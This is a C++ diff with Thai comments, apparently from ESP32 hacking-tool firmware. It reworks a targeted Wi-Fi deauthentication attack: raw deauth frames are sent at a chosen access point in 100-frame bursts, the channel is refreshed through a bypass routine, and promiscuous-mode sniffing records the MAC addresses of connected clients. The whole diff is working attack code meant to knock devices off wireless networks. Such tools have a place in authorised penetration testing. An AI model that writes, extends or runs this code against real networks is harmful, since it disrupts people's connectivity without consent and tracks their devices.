@@ -20,6 +20,8 @@
 #include <Arduino.h>
 #include <globals.h>
 #include <nvs_flash.h>
+#include <vector>
+#include <algorithm> 
 
 #define WIFI_ATK_NAME "BruceAttack"
 extern bool showHiddenNetworks;
@@ -147,6 +149,57 @@ void resetGlobalState() {
     NextPress = false;
     returnToMenu = false;
     tft.fillScreen(bruceConfig.bgColor);
+}
+
+// โครงสร้างเก็บข้อมูล Client (ต้องประกาศนอกฟังก์ชันเพื่อให้ callback ใช้ได้)
+struct ClientInfo {
+    uint8_t mac[6];
+    unsigned long last_seen;
+    bool active;
+};
+
+// ตัวแปร global สำหรับ callback (static เพื่อใช้ภายในไฟล์นี้เท่านั้น)
+static uint8_t g_targetBssid[6];
+static std::vector<ClientInfo> g_clients;
+#define CLIENT_TIMEOUT 10000  // 10 วินาที
+
+// Callback สำหรับตรวจจับ client
+void promisc_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
+    wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t*)pkt->payload;
+
+    // สนใจเฉพาะ Data packets (type 2)
+    if (ipkt->hdr.frame_control.type == 2) {
+        uint8_t *src = ipkt->hdr.addr2;
+        uint8_t *dst = ipkt->hdr.addr1;
+
+        // ตรวจสอบว่ามีฝั่งใดฝั่งหนึ่งเป็น AP เป้าหมาย
+        bool from_ap = (memcmp(src, g_targetBssid, 6) == 0);
+        bool to_ap   = (memcmp(dst, g_targetBssid, 6) == 0);
+
+        if (from_ap || to_ap) {
+            // เลือก MAC ของ client (ฝั่งที่ไม่ใช่ AP)
+            uint8_t *client_mac = from_ap ? dst : src;
+
+            // หาใน list
+            bool found = false;
+            for (auto &c : g_clients) {
+                if (memcmp(c.mac, client_mac, 6) == 0) {
+                    c.last_seen = millis();
+                    c.active = true;
+                    found = true;
+                    break;
+                }
+            }
+            if (!found && g_clients.size() < 20) {
+                ClientInfo nc;
+                memcpy(nc.mac, client_mac, 6);
+                nc.last_seen = millis();
+                nc.active = true;
+                g_clients.push_back(nc);
+            }
+        }
+    }
 }
 
 /***************************************************************************************
@@ -744,88 +797,129 @@ AGAIN:
 void target_atk(String tssid, String mac, uint8_t channel) {
     resetGlobalState();
     cleanlyStopWebUiForWiFiFeature();
-
-    // 1. ใช้ wifi_atk_setWifi() แบบที่ Flood/Clone ใช้ (APSTA)
     if (!wifi_atk_setWifi()) return;
 
-    // 2. สร้าง ap_record สำหรับเป้าหมาย
+    // แปลง MAC string เป็น bytes เก็บใน g_targetBssid
+    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &g_targetBssid[0], &g_targetBssid[1], &g_targetBssid[2],
+           &g_targetBssid[3], &g_targetBssid[4], &g_targetBssid[5]);
+
+    // สร้าง ap_record สำหรับ wsl_bypasser
     wifi_ap_record_t target_ap;
     memset(&target_ap, 0, sizeof(target_ap));
-    uint8_t bssid[6];
-    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
-    memcpy(target_ap.bssid, bssid, 6);
+    memcpy(target_ap.bssid, g_targetBssid, 6);
     target_ap.primary = channel;
 
-    // 3. เตรียม deauth frame และตั้งช่องครั้งแรก (ผ่าน wsl_bypasser)
+    // เตรียม deauth frame
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     wsl_bypasser_send_raw_frame(&target_ap, channel, _default_target);
 
-    // 4. ตัวแปรสำหรับเหตุผลหลากหลาย (เพิ่มความโหด)
-    const uint8_t reasons[] = {0x01, 0x04, 0x07, 0x08};
-    uint8_t reasonIdx = 0;
-    uint32_t frameCount = 0;
-    uint32_t lastUpdateTime = millis();
-    uint32_t lastChannelRefresh = frameCount; // สำหรับนับว่าควร refresh ช่องเมื่อไหร่
-    bool needsRedraw = true;
-    bool attackActive = true;
+    // ล้างรายชื่อ client เก่า
+    g_clients.clear();
 
-    check(SelPress);
-    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-    tft.setTextSize(FM);
-    setCpuFrequencyMhz(CONFIG_ESP_DEFAULT_CPU_FREQ_MHZ);
+    // เริ่ม promiscuous mode พร้อม callback
+    esp_wifi_set_promiscuous_rx_cb(promisc_callback);
+    esp_wifi_set_promiscuous(true);
 
-    // 5. วนโจมตี
-    while (attackActive) {
-        if (needsRedraw) {
-            drawMainBorderWithTitle("Target Deauth");
-            padprintln("");
-            padprintln("AP: " + tssid);
-            padprintln("Channel: " + String(channel));
-            padprintln(mac);
-            vTaskDelay(50 / portTICK_PERIOD_MS);
-            needsRedraw = false;
-        }
+    // ตัวแปรสำหรับ UI
+    const uint16_t TOP_HEIGHT = tftHeight * 0.6;
+    const uint16_t SPLIT_Y = BORDER_PAD_Y + FM * LH + 4 + TOP_HEIGHT;
+    uint32_t lastTime = millis();
+    uint16_t count = 0;
+    uint32_t totalFrames = 0;
+    unsigned long startTime = millis();
+    unsigned long lastClientUpdate = 0;
 
-        // --- ยิงเป็นชุด 5 ครั้ง (15 เฟรม) ---
-        for (int i = 0; i < 5; i++) {
-            deauth_frame[24] = reasons[reasonIdx];   // เปลี่ยนเหตุผล
+    while (true) {
+        // ---------- ส่ง deauth 100 รอบ ----------
+        for (int i = 0; i < 100; i++) {
             send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-            frameCount++;
+            count += 3;
+            totalFrames += 3;
+            if (EscPress) break;
         }
+        if (EscPress) break;
 
-        // เปลี่ยน reason code ทุก ๆ 100 เฟรม
-        if (frameCount % 20 == 0) {  // 20 * 5 = 100 รอบ send_raw_frame
-            reasonIdx = (reasonIdx + 1) % 4;
-        }
-
-        // ** สำคัญ **: ทุก ๆ 1000 เฟรม (200 รอบ burst) ให้ refresh ช่องสัญญาณ
-        // ด้วยการเรียก wsl_bypasser_send_raw_frame อีกครั้ง กันช่องหลุด
-        if (frameCount % 200 == 0) {  // 200 * 5 = 1000 รอบ send_raw_frame
+        // รีเฟรช channel ทุก 3000 เฟรม
+        static uint16_t refreshCnt = 0;
+        refreshCnt += 300;
+        if (refreshCnt >= 3000) {
             wsl_bypasser_send_raw_frame(&target_ap, channel, _default_target);
+            refreshCnt = 0;
         }
 
-        // อัปเดต FPS ทุก 2 วิ
-        if (millis() - lastUpdateTime >= 2000) {
-            float fps = (frameCount * 15) / 2.0;  // frameCount นับเป็นรอบ burst แต่ละรอบมี 15 เฟรม
-            tft.setCursor(tftWidth * 0.05, tftHeight - (tftHeight * 0.08));
-            tft.print("Frames: " + String((int)fps) + "/s   ");
-            frameCount = 0;
-            lastUpdateTime = millis();
-        }
-
-        if (check(SelPress) || EscPress) {
-            EscPress = false;
-            displayTextLine("Deauth Paused");
-            delay(500);
-            while (!check(SelPress)) {
-                delay(10);
-                if (check(EscPress)) { attackActive = false; break; }
+        // อัปเดต client status ทุก 2 วิ
+        if (millis() - lastClientUpdate > 2000) {
+            lastClientUpdate = millis();
+            unsigned long now = millis();
+            for (auto &c : g_clients) {
+                c.active = (now - c.last_seen < CLIENT_TIMEOUT);
             }
-            needsRedraw = true;
+        }
+
+        // ---------- วาด UI ทุก 2 วิ ----------
+        if (millis() - lastTime > 2000) {
+            drawMainBorderWithTitle("Target Deauth");
+
+            // ====== ครึ่งบน: ข้อมูลโจมตี ======
+            tft.fillRect(7, BORDER_PAD_Y + FM * LH + 4, tftWidth - 14, TOP_HEIGHT, bruceConfig.bgColor);
+            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            tft.setTextSize(FP);
+            int y = BORDER_PAD_Y + FM * LH + 10;
+            tft.drawString("AP: " + tssid, 10, y, 2); y += 16;
+            tft.drawString("MAC: " + mac, 10, y, 2); y += 16;
+            tft.drawString("Ch: " + String(channel), 10, y, 2); y += 16;
+            tft.drawString("FPS: " + String(count / 2) + " /s", 10, y, 2); y += 16;
+            unsigned long elapsed = (millis() - startTime) / 1000;
+            tft.drawString("Time: " + String(elapsed/60) + ":" + String(elapsed%60), 10, y, 2); y += 16;
+            tft.drawString("Reason: 0x07", 10, y, 2); y += 16;
+            tft.drawString("Deauth: ON", 10, y, 2);
+
+            // ✅ แสดงจำนวน Client
+            int activeCount = 0;
+            for (auto &c : g_clients) if (c.active) activeCount++;
+            tft.drawString("Clients: " + String(activeCount) + " / " + String(g_clients.size()), 10, y + 16, 2);
+            y += 32;
+
+            // ====== ครึ่งล่าง: ตาราง Client ======
+            tft.fillRect(7, SPLIT_Y, tftWidth - 14, tftHeight - SPLIT_Y - 20, TFT_DARKGREY);
+            tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
+            tft.drawString("CLIENTS", 10, SPLIT_Y + 2, 2);
+            tft.drawString("MAC", 10, SPLIT_Y + 18, 1);
+            tft.drawString("Last seen", 120, SPLIT_Y + 18, 1);
+            tft.drawString("Status", 200, SPLIT_Y + 18, 1);
+
+            int cy = SPLIT_Y + 32;
+            int shown = 0;
+            for (auto &c : g_clients) {
+                if (shown >= 6) break;
+                char macstr[18];
+                snprintf(macstr, sizeof(macstr), "%02X:%02X:%02X:%02X:%02X:%02X",
+                         c.mac[0], c.mac[1], c.mac[2], c.mac[3], c.mac[4], c.mac[5]);
+                tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
+                tft.drawString(macstr, 10, cy, 1);
+                tft.setTextColor(TFT_YELLOW, TFT_DARKGREY);
+                tft.drawString(String((millis() - c.last_seen) / 1000) + "s", 120, cy, 1);
+                tft.setTextColor(c.active ? TFT_GREEN : TFT_RED, TFT_DARKGREY);
+                tft.drawString(c.active ? "ON" : "OFF", 200, cy, 1);
+                cy += 12;
+                shown++;
+            }
+
+            // สรุปจำนวน client
+            tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
+            tft.drawString("Total: " + String(g_clients.size()) + " Active: " + String(activeCount),
+                           10, SPLIT_Y + 18 + (shown+1)*12, 1);
+
+            // รีเซ็ต counter FPS
+            count = 0;
+            lastTime = millis();
         }
     }
 
+    // cleanup
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
     wifi_atk_unsetWifi();
     returnToMenu = true;
 }
